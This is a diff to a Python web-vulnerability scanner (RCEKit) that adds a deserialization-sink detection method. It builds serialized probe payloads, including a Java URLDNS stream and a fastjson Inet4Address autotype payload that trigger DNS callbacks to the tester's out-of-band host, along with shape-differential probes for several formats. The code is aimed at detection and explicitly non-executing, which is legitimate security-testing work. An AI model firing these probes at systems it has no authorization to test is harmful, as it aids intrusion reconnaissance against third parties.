@@ -6,6 +6,7 @@ import logging
 import random
 import re
 import string
+import struct
 import sys
 import urllib.parse
 from dataclasses import asdict, dataclass, field as dataclass_field, replace as dataclass_replace
@@ -26,7 +27,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.33.0"
+__version__ = "2.34.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -209,6 +210,18 @@ def build_plain_request(text: str, scheme: Optional[str] = None
                if name.lower() not in {"host", "content-length"}]
     return (f"{scheme}://{host}{req['target']}", req["method"],
             req["body"] or None, headers)
+
+
+def _parse_name_list(value: Optional[str]) -> Optional[Tuple[str, ...]]:
+    """A comma-separated name list, or ``None`` for ``auto``/unset.
+
+    Validation of the *names* belongs where the declared set lives, so this
+    only splits; the method that owns the corpus section refuses an unknown one
+    by name rather than narrowing the run to nothing behind a typo."""
+    if not value or value.strip().lower() == "auto":
+        return None
+    names = tuple(part.strip().lower() for part in value.split(",") if part.strip())
+    return names or None
 
 
 def parse_bridges(value: Optional[str]) -> Tuple[str, ...]:
@@ -460,6 +473,9 @@ class RCEKit:
         # in the corpus for the same reason eval_carriers are: coverage grows
         # without touching Python.
         self.bridges: Dict[str, Dict[str, Any]] = {}
+        # Format probes for the deserialization-sink method, declared in the
+        # corpus so an ecosystem can be added without touching Python.
+        self.deser_probes: Dict[str, Dict[str, Any]] = {}
         self._load_template_payloads()
 
         # Encoding and obfuscation techniques.
@@ -539,6 +555,7 @@ class RCEKit:
             self.detection_payloads = data.get("detection_payloads", {})
             self.eval_carriers = data.get("eval_carriers", {})
             self.bridges = data.get("bridges", {})
+            self.deser_probes = data.get("deser_probes", {})
         except Exception as exc:
             message = f"unable to parse {self.template_path}: {exc}"
             logger.error("%s", message)
@@ -563,6 +580,7 @@ class RCEKit:
             self.detection_payloads = data.get("detection_payloads", {})
             self.eval_carriers = data.get("eval_carriers", {})
             self.bridges = data.get("bridges", {})
+            self.deser_probes = data.get("deser_probes", {})
         except Exception as exc:  # pragma: no cover — a build-time guarantee
             message = f"unable to parse the built-in payload corpus: {exc}"
             logger.error("%s", message)
@@ -4574,6 +4592,269 @@ class OobCallback(DetectionMethod):
 
 # The detection methods RCEKit can run, keyed by their --methods name. Adding a
 # phase = adding a class above and an entry here.
+class DeserSink(DetectionMethod):
+    """Proves an endpoint **deserializes attacker-controlled data**, and stops there.
+
+    Deserialization RCE (fastjson, shiro, weblogic, jenkins) cannot be confirmed
+    by the value-oracle model: the payload is a serialized object graph and
+    gadget selection is classpath-specific, so whether execution is reachable
+    depends on jars RCEKit cannot see. That is genuinely out of scope. What is
+    *in* scope is the honest middle step -- showing the endpoint parses the data
+    at all, which is a real, reportable finding and the prerequisite for every
+    gadget chain.
+
+    So this method never emits ``confirmed``. Its strongest outcome is its own
+    verdict, ``deserialization-sink``, and the report says outright that
+    reaching RCE from there depends on classpath gadgets. Collapsing it into
+    ``confirmed`` would break the one guarantee the whole tool rests on;
+    collapsing it into ``needs-review`` would throw away a proven finding.
+
+    Two oracles, of deliberately different strength:
+
+    * **shape** (safe, no listener) -- a differential across three payloads: a
+      well-formed object stream, the same stream truncated, and the format's
+      magic bytes followed by noise. A parser distinguishes the well-formed one;
+      a parameter that is merely stored treats all three as opaque text. That is
+      a fingerprint, not proof, so it reaches ``needs-review`` only.
+    * **dns** (needs ``--oob-host``) -- a non-executing gadget whose only side
+      effect is a name lookup: URLDNS for Java serialization, an
+      ``Inet4Address`` autotype for polymorphic JSON. A callback proves the
+      object graph was reconstructed. That reaches ``deserialization-sink``.
+    """
+    name = "deser"
+    tier = "deserialization-sink"
+    aggregate = True
+
+    SHAPE_FORMS = ("wellformed", "truncated", "noise")
+
+    # --- Java serialization ------------------------------------------------
+    #
+    # Emitted as bytes rather than declared in the corpus because the URL host
+    # is length-prefixed *inside* the stream and changes for every probe, so
+    # there is no static string to declare. Everything except the host is
+    # constant, and the constants below are the exact bytes OpenJDK's own
+    # ObjectOutputStream produces for HashMap{URL: String} -- diffed against a
+    # real JVM's output, byte for byte, up to the one place Java back-references
+    # the repeated host string where this writes a fresh copy (equivalent for
+    # the reader, and simpler here).
+    _JAVA_HASHMAP = (
+        b"\xac\xed\x00\x05"                          # STREAM_MAGIC, version 5
+        b"\x73\x72\x00\x11java.util.HashMap"
+        b"\x05\x07\xda\xc1\xc3\x16\x60\xd1"      # serialVersionUID
+        b"\x03\x00\x02"                              # SERIALIZABLE, 2 fields
+        b"\x46\x00\x0aloadFactor"
+        b"\x49\x00\x09threshold"
+        b"\x78\x70"
+        b"\x3f\x40\x00\x00"                          # loadFactor 0.75f
+        b"\x00\x00\x00\x0c"                          # threshold 12
+        b"\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01"  # capacity 16, size 1
+    )
+    _JAVA_URL_DESC = (
+        b"\x73\x72\x00\x0cjava.net.URL"
+        b"\x96\x25\x37\x36\x1a\xfc\xe4\x72"
+        b"\x03\x00\x07"
+        b"\x49\x00\x08hashCode"
+        b"\x49\x00\x04port"
+        b"\x4c\x00\x09authority\x74\x00\x12Ljava/lang/String;"
+        b"\x4c\x00\x04file\x71\x00\x7e\x00\x03"
+        b"\x4c\x00\x04host\x71\x00\x7e\x00\x03"
+        b"\x4c\x00\x08protocol\x71\x00\x7e\x00\x03"
+        b"\x4c\x00\x03ref\x71\x00\x7e\x00\x03"
+        b"\x78\x70"
+    )
+
+    @staticmethod
+    def _java_string(text: str) -> bytes:
+        raw = text.encode("utf-8")
+        return b"\x74" + struct.pack(">H", len(raw)) + raw
+
+    @classmethod
+    def java_urldns(cls, host: str) -> bytes:
+        """A URLDNS stream for ``host``: a ``HashMap`` holding one ``java.net.URL``.
+
+        Non-executing by construction, and that is the whole point. On
+        deserialization ``HashMap.readObject`` hashes its key, ``URL.hashCode``
+        asks the stream handler for the host address, and the JVM resolves the
+        name. No class outside ``java.util``/``java.net`` is referenced, so
+        there is no gadget here and nothing to run -- the callback proves the
+        object graph was reconstructed, which is exactly the claim this method
+        makes and no more.
+
+        ``hashCode`` is written as -1 so the reader must compute it; a cached
+        value would mean the lookup never happens."""
+        return (cls._JAVA_HASHMAP + cls._JAVA_URL_DESC
+                + b"\xff\xff\xff\xff"           # hashCode = -1 (not yet computed)
+                + b"\xff\xff\xff\xff"           # port = -1
+                + cls._java_string(host)          # authority
+                + cls._java_string("/")           # file
+                + cls._java_string(host)          # host
+                + cls._java_string("http")        # protocol
+                + b"\x70"                         # ref = null
+                + b"\x78"                         # end of the URL's fields
+                + cls._java_string("rk")          # the map value
+                + b"\x78")                        # end of the HashMap's block data
+
+    # --- probe construction -------------------------------------------------
+
+    def applicable(self, record: "PayloadRecord") -> bool:
+        # The payload is a serialized object, not a shell command or an
+        # expression, so the break-out contexts have nothing to break out of.
+        # It rides the raw context and the transport contexts, exactly as
+        # `write` does and for the same reason.
+        if not (getattr(self.gen, "deser_probes", None) or {}):
+            return False
+        return (record.context == "raw"
+                or record.context in self.gen.transport_contexts)
+
+    def _ecosystems(self) -> List[Tuple[str, Dict[str, Any]]]:
+        """The ecosystems to probe, honouring ``--deser-formats``.
+
+        An unknown name is refused rather than dropped: narrowing a run to
+        nothing because of a typo would report a clean negative from a run that
+        probed no format at all."""
+        wanted = self.config.get("deser_formats")
+        declared = getattr(self.gen, "deser_probes", None) or {}
+        if not wanted:
+            return list(declared.items())
+        unknown = [name for name in wanted if name not in declared]
+        if unknown:
+            raise ValueError(f"unknown deserialization format(s): {', '.join(unknown)}; "
+                             f"choose from auto, {', '.join(sorted(declared))}")
+        return [(name, declared[name]) for name in wanted]
+
+    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
+        probes: List[Probe] = []
+        listener = self.config.get("oob_listener")
+        host = str(self.config.get("oob_host") or "").strip().rstrip(".")
+        for name, spec in self._ecosystems():
+            magic = str(spec.get("magic") or "")
+            wellformed = str(spec.get("wellformed") or "")
+            if not wellformed:
+                continue
+            # Same magic bytes, same length, random tail: an endpoint that
+            # merely stores the value cannot tell this from the real thing,
+            # while a parser rejects it where it rejects the truncated form.
+            noise = magic + "".join(
+                rng.choice(string.ascii_letters + string.digits)
+                for _ in range(max(1, len(wellformed) - len(magic))))
+            for form, body in (("wellformed", wellformed),
+                               ("truncated", str(spec.get("truncated") or "")),
+                               ("noise", noise)):
+                if not body:
+                    continue
+                probes.append(Probe(payload=self._wrap_context(record, body), expected="",
+                                    carrier=name, phase="shape/" + form))
+            gadget = spec.get("dns")
+            if not gadget or not host:
+                continue
+            token = "rk" + "".join(rng.choice(string.ascii_lowercase + string.digits)
+                                   for _ in range(10))
+            callback = token + "." + host
+            if gadget == "java_urldns":
+                body = base64.b64encode(self.java_urldns(callback)).decode()
+            else:
+                body = str(gadget).replace("{host}", callback)
+            probes.append(Probe(payload=self._wrap_context(record, body), expected=token,
+                                carrier=name, phase="dns"))
+            if listener is not None:
+                listener.tokens[token] = {"payload": body, "category": "detection",
+                                          "context": record.context}
+        return probes
+
+    # --- verdicts -----------------------------------------------------------
+
+    @staticmethod
+    def _signature(obs: "Observation") -> Tuple[Any, ...]:
+        """A response fingerprint stable across the volatile parts of a page.
+
+        Long digit and hex runs are dropped because request ids, timestamps and
+        CSRF tokens change between two otherwise identical error pages, and
+        comparing them raw would make every endpoint look like it distinguishes
+        the three forms."""
+        body = re.sub(r"[0-9a-f]{8,}", "", (obs.body or "").lower())
+        body = re.sub(r"\d{4,}", "", body)
+        return (obs.status, len(body) // 16, body)
+
+    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
+                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
+        out: List[Tuple[Probe, Verdict]] = []
+        by_carrier: Dict[str, Dict[str, Tuple[Probe, Observation]]] = {}
+        dns_probes: List[Tuple[Probe, Observation]] = []
+        for probe, obs in series:
+            if probe.phase == "dns":
+                dns_probes.append((probe, obs))
+            elif probe.phase and probe.phase.startswith("shape/"):
+                by_carrier.setdefault(probe.carrier or "?", {})[
+                    probe.phase.split("/", 1)[1]] = (probe, obs)
+        for carrier in sorted(by_carrier):
+            out.append(self._shape_verdict(carrier, by_carrier[carrier]))
+        out.extend(self._dns_verdicts(dns_probes))
+        return out or None
+
+    def _shape_verdict(self, carrier, forms):
+        anchor = (forms.get("wellformed") or next(iter(forms.values())))[0]
+        if len(forms) < len(self.SHAPE_FORMS):
+            return anchor, Verdict("inconclusive",
+                                   carrier + ": the shape differential needs all three forms "
+                                   "and did not get them")
+        if any(obs.status is None for _probe, obs in forms.values()):
+            return anchor, Verdict("error",
+                                   carrier + ": a shape probe never reached the target")
+        signatures = {form: self._signature(obs) for form, (_p, obs) in forms.items()}
+        if (signatures["wellformed"] != signatures["truncated"]
+                and signatures["wellformed"] != signatures["noise"]):
+            return anchor, Verdict(
+                "needs-review",
+                carrier + ": the endpoint answers a well-formed object stream differently from "
+                "both a truncated one and the format's magic bytes plus noise, which is what a "
+                "parser looks like -- a fingerprint, NOT proof of deserialization and not RCE")
+        return anchor, Verdict(
+            "negative",
+            carrier + ": the endpoint answers all three forms alike, so nothing here parses "
+            "the format")
+
+    def _dns_verdicts(self, dns_probes):
+        import time
+        out: List[Tuple[Probe, Verdict]] = []
+        if not dns_probes:
+            return out
+        listener = self.config.get("oob_listener")
+        if listener is None:
+            for probe, _obs in dns_probes:
+                out.append((probe, Verdict(
+                    "inconclusive",
+                    probe.carrier + ": the DNS gadget was sent but no listener was running, so "
+                    "no callback could be observed")))
+            return out
+        wait = float(self.config.get("oob_wait", 6.0))
+        deadline = time.time() + wait
+        wanted = {probe.expected for probe, _ in dns_probes}
+        while time.time() < deadline:
+            if wanted <= {hit.get("token") for hit in listener.hits}:
+                break
+            time.sleep(0.25)
+        received = {hit.get("token") for hit in listener.hits}
+        for probe, _obs in dns_probes:
+            if probe.expected in received:
+                out.append((probe, Verdict(
+                    "deserialization-sink",
+                    probe.carrier + ": the target resolved " + probe.expected + ", so it "
+                    "reconstructed an attacker-supplied object graph. The gadget is "
+                    "non-executing by construction -- this is NOT proof of RCE, which from "
+                    "here depends on classpath gadgets and is outside what RCEKit confirms")))
+            else:
+                out.append((probe, Verdict(
+                    "negative", probe.carrier + ": no callback for " + probe.expected)))
+        return out
+
+    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
+        # Never reached while there are probes: confirm_each always answers.
+        # Kept because the engine's contract allows either, and a method that
+        # fell through to a single verdict would report one row for a sweep of
+        # several ecosystems.
+        return Verdict("inconclusive", "no deserialization probe produced a decision")
+
+
 DETECTION_METHODS = {
     ReflectedMath.name: ReflectedMath,
     FileBased.name: FileBased,
@@ -4581,6 +4862,7 @@ DETECTION_METHODS = {
     ParametricTime.name: ParametricTime,
     EvalExpr.name: EvalExpr,
     OobCallback.name: OobCallback,
+    DeserSink.name: DeserSink,
 }
 
 
@@ -4610,7 +4892,12 @@ def overall_detection_verdict(results: List[Dict[str, Any]]) -> str:
     if not results:
         return "nothing-tested"
     verdicts = {result["verdict"] for result in results}
-    for tier in ("confirmed", "needs-review"):
+    # `deserialization-sink` sits below both RCE tiers on purpose. It is a
+    # *proven* finding, but about a different property -- the endpoint parses
+    # attacker-controlled object data -- and a suspected RCE outranks a proven
+    # non-RCE in triage. It never becomes `confirmed`, which is reserved for
+    # execution and has to stay that way to mean anything.
+    for tier in ("confirmed", "needs-review", "deserialization-sink"):
         if tier in verdicts:
             return tier
     if verdicts == {"error"}:
@@ -5482,6 +5769,12 @@ def main():
                              "command; sq/dq break out of a surrounding quote; subshell reaches a "
                              "quoted value through $(...) and backticks without closing the quote. "
                              "Narrow it to cut request count once the sink's shape is known.")
+    parser.add_argument("--deser-formats", default=None, metavar="NAMES",
+                        help="(--methods deser) Serialization ecosystems to probe: auto "
+                             "(default, all of them) or names from the corpus 'deser_probes' "
+                             "section. The deser method proves an endpoint DESERIALIZES "
+                             "attacker data; it never reports RCE, because reaching execution "
+                             "from there depends on classpath gadgets RCEKit cannot see.")
     parser.add_argument("--bridges", default=None, metavar="NAMES",
                         help="(--methods) Query-language bridges to carry the command probes "
                              "through: none (default), auto, or names from the corpus 'bridges' "
@@ -5599,6 +5892,7 @@ def main():
         sink_env = parse_sink_env(from_profile(args.sink_env, "sink_env"))
         write_langs = parse_write_langs(from_profile(args.write_lang, "write_lang"))
         bridges = parse_bridges(from_profile(args.bridges, "bridges"))
+        deser_formats = _parse_name_list(from_profile(args.deser_formats, "deser_formats"))
     except ValueError as exc:
         print(f"[!] {exc}")
         return 1
@@ -5930,6 +6224,7 @@ def main():
                                 "observe_data": observe_data,
                                 "observe_headers": observe_headers,
                                 "bridges": bridges,
+                                "deser_formats": deser_formats,
                                 # The bridges honour the same safety ordering as
                                 # every corpus payload, so a stateful bridge is
                                 # held back by the same flag rather than riding
@@ -6023,6 +6318,23 @@ def main():
                           f"the write is attempted at each of {len(injection_runs)} candidate "
                           "point(s). Narrow with -p/--max-points if that is more target state "
                           "than you intend to change.")
+            if DeserSink.name in method_names:
+                declared_deser = getattr(generator, "deser_probes", None) or {}
+                chosen_deser = list(deser_formats or declared_deser)
+                unknown = [name for name in chosen_deser if name not in declared_deser]
+                if unknown:
+                    print(f"[!] Unknown --deser-formats: {', '.join(unknown)}. "
+                          f"Available: auto, {', '.join(sorted(declared_deser))}.")
+                    return 1
+                print(f"[detect] deserialization sink probes: {', '.join(chosen_deser)}. "
+                      "This method NEVER reports RCE — it proves the endpoint parses "
+                      "attacker-supplied object data, and reaching execution from there "
+                      "depends on classpath gadgets RCEKit cannot see.")
+                with_dns = [n for n in chosen_deser if declared_deser[n].get("dns")]
+                if with_dns and not args.oob_host:
+                    print(f"[!] {', '.join(with_dns)} also has a non-executing DNS gadget, which "
+                          "needs --oob-host and a listener. Without it only the error-shape "
+                          "oracle runs, and that reaches needs-review at best.")
             if bridges:
                 declared = getattr(generator, "bridges", None) or {}
                 if bridges == ("auto",):
@@ -6210,6 +6522,19 @@ def main():
                           f"{result['payload']}   ({result['detail']})")
                     if result.get("cleanup"):
                         print(f"      cleanup: {result['cleanup']}")
+            deser_sinks = [r for r in results if r["verdict"] == "deserialization-sink"]
+            if deser_sinks:
+                # Its own section, never folded into CONFIRMED. The finding is
+                # real and proven; what it proves is not execution.
+                print(f"\n[detect] {len(deser_sinks)} DESERIALIZATION SINK(S) — "
+                      "NOT proof of RCE:")
+                for result in deser_sinks:
+                    at = f" at {result['point']}" if result.get("point") else ""
+                    print(f"  [{result['method']}/{result['context']}]{at} "
+                          f"{result['payload'][:100]}   ({result['detail']})")
+                print("  → the endpoint reconstructs attacker-supplied object graphs. Reaching "
+                      "RCE from here depends on gadgets in the target's classpath, which is "
+                      "outside what RCEKit confirms.")
             needs_review = [r for r in results if r["verdict"] == "needs-review"]
             if needs_review:
                 print(f"\n[detect] {len(needs_review)} NEEDS-REVIEW candidates "
@@ -7031,6 +7356,53 @@ EMBEDDED_PAYLOAD_CORPUS = r"""
       "cleanup": null,
       "notes": "The expect:// stream wrapper executes its URI through a shell and yields the output as the entity's value, so a document that renders the entity returns the command output directly. The extension is rarely installed, which is exactly why this is opt-in rather than part of a default run.",
       "verified": "not validated here; documented behaviour of the PHP expect stream wrapper"
+    }
+  },
+  "deser_probes": {
+    "java": {
+      "label": "Java ObjectInputStream",
+      "wellformed": "rO0ABXQABHJjZWs=",
+      "truncated": "rO0ABXQABA==",
+      "magic": "rO0AB",
+      "dns": "java_urldns",
+      "notes": "A base64 java.io serialization stream carrying a single String -- no class outside java.lang, so nothing in it can run. The truncated form is the same stream cut short, which a real ObjectInputStream rejects with a stream-corruption error while a parameter that is merely stored treats both as opaque text. The DNS shape is built in Python rather than declared here because the URL host is length-prefixed inside the stream and changes per probe.",
+      "verified": "OpenJDK 21: the generated URLDNS stream deserializes to HashMap{http://<host>/=rk} and issues a DNS query for <host>, with no code execution"
+    },
+    "php": {
+      "label": "PHP unserialize()",
+      "wellformed": "O:8:\"stdClass\":0:{}",
+      "truncated": "O:8:\"stdClass\":0:",
+      "magic": "O:8:\"stdClass\":",
+      "dns": null,
+      "notes": "stdClass has no magic methods, so unserialize() on this builds an empty object and runs nothing. PHP has no non-executing DNS gadget of the URLDNS kind -- every known chain goes through __wakeup/__destruct -- so only the error-shape oracle applies here.",
+      "verified": "documented PHP serialization format; not exercised against a live PHP endpoint in this environment"
+    },
+    "dotnet": {
+      "label": ".NET BinaryFormatter",
+      "wellformed": "AAEAAAD/////AQAAAAAAAAAGAQAAAAJyawtd",
+      "truncated": "AAEAAAD/////AQAAAAAAAAAG",
+      "magic": "AAEAAAD/////",
+      "dns": null,
+      "notes": "The BinaryFormatter header plus a single string record. Only the error-shape oracle applies: .NET's non-executing gadgets are type-confusion chains rather than a DNS side effect.",
+      "verified": "documented BinaryFormatter record layout; not exercised against a live .NET endpoint in this environment"
+    },
+    "python_pickle": {
+      "label": "Python pickle",
+      "wellformed": "gASVBgAAAAAAAACMAnJrlC4=",
+      "truncated": "gASVBgAAAAAAAACM",
+      "magic": "gASV",
+      "dns": null,
+      "notes": "A protocol-4 pickle of the string 'rk'. It contains no GLOBAL or REDUCE opcode, so loading it constructs a string and calls nothing. Only the error-shape oracle applies.",
+      "verified": "round-trips through pickle.loads in this environment"
+    },
+    "fastjson": {
+      "label": "fastjson / Jackson polymorphic JSON",
+      "wellformed": "{\"@type\":\"java.lang.String\",\"val\":\"rk\"}",
+      "truncated": "{\"@type\":\"java.lang.String\",\"val\":",
+      "magic": "{\"@type\":",
+      "dns": "{\"rk\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"{host}\"}}",
+      "notes": "Polymorphic deserialization by type name. java.net.Inet4Address resolves its val on construction, which is a DNS side effect and not code execution -- the same honest signal URLDNS gives for the binary format, expressible as plain text because JSON is not length-prefixed.",
+      "verified": "documented fastjson autotype behaviour; not exercised against a live fastjson endpoint in this environment"
     }
   }
 }
